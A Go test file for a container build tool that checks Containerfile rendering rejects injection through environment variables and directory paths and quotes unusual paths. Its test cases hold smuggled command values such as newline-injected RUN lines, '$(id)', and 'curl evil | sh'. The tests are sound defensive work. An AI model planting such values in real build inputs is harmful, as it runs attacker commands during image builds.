package build

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rhuss/sandcast/internal/plan"
)

// The 20-user section renders image env and dirs from the plan. Values that
// would add a Containerfile line or shell syntax are refused at render time,
// whatever produced the plan.
func TestUserSectionRefusesInjection(t *testing.T) {
	tests := map[string]struct {
		mutate func(p *plan.Plan)
		want   string
	}{
		"env name with space": {func(p *plan.Plan) {
			p.Image.Env = []plan.EnvVar{{Name: "A B", Value: "x"}}
		}, `env name "A B"`},
		"env name with newline": {func(p *plan.Plan) {
			p.Image.Env = []plan.EnvVar{{Name: "A=1\nRUN id\nENV B", Value: "x"}}
		}, "env name"},
		"env value with newline": {func(p *plan.Plan) {
			p.Image.Env = []plan.EnvVar{{Name: "A", Value: "x\nRUN curl evil | sh"}}
		}, `env "A": value contains a control character`},
		"env value with carriage return": {func(p *plan.Plan) {
			p.Image.Env = []plan.EnvVar{{Name: "A", Value: "x\ry"}}
		}, "control character"},
		"user dir with newline": {func(p *plan.Plan) {
			p.Image.Dirs = []plan.Dir{{Path: "/opt/x\nRUN id", Owner: "user"}}
		}, "directory"},
		"root dir with newline": {func(p *plan.Plan) {
			p.Image.Dirs = []plan.Dir{{Path: "/opt/x\nRUN id", Owner: "root"}}
		}, "directory"},
		"relative dir": {func(p *plan.Plan) {
			p.Image.Dirs = []plan.Dir{{Path: "opt/x", Owner: "user"}}
		}, "directory"},
		"workspace dir with newline": {func(p *plan.Plan) {
			p.BaseImage.OvermountHome = "/w\nRUN id"
		}, "directory"},
	}
	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			p := testPlan(t)
			tc.mutate(p)
			_, err := Assemble(p)
			require.Error(t, err)
			assert.Contains(t, err.Error(), tc.want)
		})
	}
}

func TestUserSectionQuotesDirs(t *testing.T) {
	p := testPlan(t)
	p.Image.Dirs = []plan.Dir{
		{Path: "/opt/a b;id", Owner: "user"},
		{Path: "/opt/$(id)", Owner: "root"},
		{Path: "/opt/go", Owner: "user"},
	}
	got, err := Assemble(p)
	require.NoError(t, err)
	assert.Contains(t, got, `RUN install -d -o sandbox -g sandbox /sandbox '/opt/a b;id' /opt/go \`)
	assert.Contains(t, got, ` && install -d '/opt/$(id)'`)
}
